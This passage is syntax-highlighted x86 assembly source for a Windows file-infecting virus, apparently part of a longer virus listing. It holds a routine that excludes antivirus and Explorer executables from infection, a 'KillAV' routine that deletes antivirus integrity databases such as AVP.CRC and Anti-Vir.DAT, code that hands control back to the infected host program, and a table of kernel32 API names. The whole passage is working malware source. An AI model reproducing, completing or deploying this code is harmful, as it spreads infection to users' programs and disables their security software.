</span><span class="sc5">flag</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">ValidateName</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">avoid_list</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;нpoint avoid list</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">repeat_check_files</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrlen</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нget length of string</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                   </span><span class="sc1">;нcompare string</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_invalid</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;нgo to the next name</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">            </span><span class="sc1">;нthe end?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">file_valid</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">repeat_check_files</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">file_valid</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                     </span><span class="sc1">;нfile can be infected</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">file_invalid</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">;нfile cannot be infected</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">avoid_list</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'TB'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'F-'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AW'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AV'</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NAV'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PAV'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RAV'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NVC'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FPR'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DSS'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'IBM'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'INOC'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ANTI'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SCN'</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VSAF'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'VSWP'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'PANDA'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DRWEB'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FSAV'</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SPIDER'</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ADINF'</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'EXPLORER'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;нhmmmm...</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SONIQUE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SQSTART'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">KillAV</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">searchfiles</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;нpoint to Search Record</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">av_list</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;нpoint av files list</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">locate_next_av</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">av_kill_done</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">            </span><span class="sc1">;нis this the end?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">av_kill_done</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;нpush search rec. address</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;нpush filename address</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindFirstFileA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;нfind first match</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">             </span><span class="sc1">;нcheck for EAX = -1</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_av_file</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.WFD_cFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;нESI = ptr to filename</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_SetFileAttributes</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">;нpush filename address</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DeleteFileA</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;нdelete file!</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_FindClose</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;нclose the find handle</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">next_av_file</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">locate_next_av</span><span class="sc0">              </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">av_kill_done</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">popad</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">searchfiles</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">av_list</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"AVP.CRC"</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;нthe av files to kill</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"IVP.NTZ"</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Anti-Vir.DAT"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CHKList.MS"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CHKList.CPS"</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SmartCHK.MS"</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SmartCHK.CPS"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">               </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">ReturnToHost</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;нHere we return to the</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">restore_seh</span><span class="sc0">                 </span><span class="sc1">;нhost</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">ExceptionExit</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">;нif we had an error we</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;нmust restore the ESP</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">restore_seh</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;нand restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;нreturning to the host...</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BDh</span><span class="sc0">                     </span><span class="sc1">;нrestore delta handle</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gen1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;нis it generation 0?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">generation0_exit</span><span class="sc0">             </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">@11</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;нprepare to jump to</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;нthe relocating code</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@14</span><span class="sc4">-</span><span class="sc5">relocating_code</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;нdo it!</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">generation0_exit</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">gen1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">CheckError</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">                   </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;нsets carry flag if</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">error_found</span><span class="sc0">                  </span><span class="sc1">;нeax = 0 or eax = -1</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">error_found</span><span class="sc0">                  </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
                           </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">error_found</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc5">CheckError</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                    </span><span class="sc1">;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc1">;RoundUp:                      ;нThis routine rounds</span><span class="sc0">
</span><span class="sc1">;   push edx                   ;нthe value in EAX to</span><span class="sc0">
</span><span class="sc1">;   xor edx, edx                   ;нthe value in ECX (used</span><span class="sc0">
</span><span class="sc1">;   div ecx                    ;нto align section and</span><span class="sc0">
</span><span class="sc1">;   inc ax                     ;нfile sizes).</span><span class="sc0">
</span><span class="sc1">;   mul ecx                    ;н</span><span class="sc0">
</span><span class="sc1">;   pop edx                    ;н</span><span class="sc0">
</span><span class="sc1">;   ret                    ;н</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc5">k32_API_names</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">                </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetModuleHandleA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ExitProcess"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GlobalAlloc"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GlobalFree"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetDriveTypeA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;н</span><span class="sc0">
          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;н</span><span class="sc0">
